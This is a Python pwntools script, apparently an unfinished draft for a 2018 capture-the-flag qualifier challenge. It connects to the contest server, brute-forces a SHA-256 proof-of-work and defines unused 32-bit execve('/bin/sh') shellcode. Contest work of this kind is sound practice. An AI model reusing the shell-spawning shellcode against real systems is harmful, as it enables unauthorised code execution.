#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
# context.update(arch='i386')
context.update(arch='amd64')
exe = './path/to/binary'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'e4771e24.quals2018.oooverflow.io'
port = int(args.PORT or 31337)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

# Execute the target binary locally
def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Connect to the process on the remote host
def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

start = local if args.LOCAL else remote

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


import sys
import struct
import hashlib

# inspired by C3CTF's POW

def pow_hash(challenge, solution):
    return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()

def check_pow(challenge, n, solution):
    h = pow_hash(challenge, solution)
    return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):
    candidate = 0
    while True:
        if check_pow(challenge, n, candidate):
            return candidate
        candidate += 1

        
io = start()

result1 = io.recvline()
result2 = io.recvline()
result3 = io.recvline()
challenge = result2.split(' ')[1]
n = result3.split(' ')[1]
print("challenge is {}".format(challenge))
print("n is {}".format(n))

solution = solve_pow(challenge, int(n))
hash = pow_hash(challenge, solution)
print('Solution: {} -> {}'.format(solution, hash))
io.recvuntil("Solution:")
print("sending solution...")

shellcode = '\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80'

print('SYS_read: {}'.format(constants.eval('SYS_read')))

#io.send(shellcode)
print("len of solution is {}".format(len(str(solution))))

io.sendline(str(solution))
#io.send('AAAA')

io.interactive()


